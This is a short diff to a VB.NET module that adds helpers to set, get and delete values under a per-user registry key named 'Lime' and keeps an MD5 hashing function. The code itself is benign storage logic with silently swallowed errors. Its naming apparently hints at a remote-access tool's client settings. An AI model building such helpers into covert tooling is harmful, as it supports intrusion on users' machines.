@@ -1,6 +1,31 @@
 ﻿Imports System.IO
+Imports Microsoft.Win32
 
 Module S_Functions
+
+    Function DLV(ByVal n As String) ' delete value in my Registry Key RG
+        Try
+            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").DeleteValue(n)
+        Catch ex As Exception
+        End Try
+    End Function
+
+    Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
+        Try
+            Return Registry.CurrentUser.CreateSubKey("Software\" & "Lime").GetValue(n, "")
+        Catch ex As Exception
+            Return ""
+        End Try
+    End Function
+
+    Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
+        Try
+            Registry.CurrentUser.CreateSubKey("Software\" & "Lime").SetValue(n, t)
+            Return True
+        Catch ex As Exception
+            Return False
+        End Try
+    End Function
 
     Public Function getMD5Hash(ByVal B As Byte()) As String
         B = New Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(B)
